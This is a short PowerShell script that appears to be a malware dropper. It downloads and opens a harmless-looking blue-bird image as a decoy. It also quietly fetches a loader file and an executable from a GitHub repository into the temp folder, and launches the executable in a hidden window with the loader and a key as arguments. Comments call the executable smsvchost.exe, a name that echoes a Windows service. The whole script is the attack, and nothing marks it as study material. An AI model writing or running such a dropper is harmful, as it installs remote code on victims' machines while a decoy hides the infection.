try {
    # Download the image
    $imageUrl = "https://png.pngtree.com/png-vector/20191121/ourmid/pngtree-blue-bird-vector-or-color-illustration-png-image_2013004.jpg"
    $imagePath = "$env:TEMP\blue-bird.jpg"
    Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath
    
    # Open the downloaded image
    if (Test-Path $imagePath) {
        Start-Process $imagePath
    } else {
        Write-Host "Image download failed."
    }

    # Download loader.bin
    $loaderUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/loader.bin"
    $loaderPath = "$env:TEMP\loader.bin"
    Invoke-WebRequest -Uri $loaderUrl -OutFile $loaderPath

    # Download smsvchost.exe
    $smsvchostUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/xcode.exe"
    $smsvchostPath = "$env:TEMP\xcode.exe"
    Invoke-WebRequest -Uri $smsvchostUrl -OutFile $smsvchostPath

    # Run smsvchost.exe with loader.bin as an argument in the background
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = $smsvchostPath
    $processInfo.Arguments = "`"$loaderPath`" supersecretkey"
    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden  # Run invisibly
    $processInfo.UseShellExecute = $false  # Required for hidden window
    $processInfo.RedirectStandardInput = $true  # Redirect standard input to send keys

    $process = [System.Diagnostics.Process]::Start($processInfo)

    # Wait for 1 second to ensure the process is ready
    Start-Sleep -Seconds 1

    # Send the "Enter" key to the process
    $process.StandardInput.WriteLine()  # Sends an "Enter" key press
    $process.StandardInput.Close()     # Close the input stream
}
catch {
    Write-Host "An error occurred: $_"
}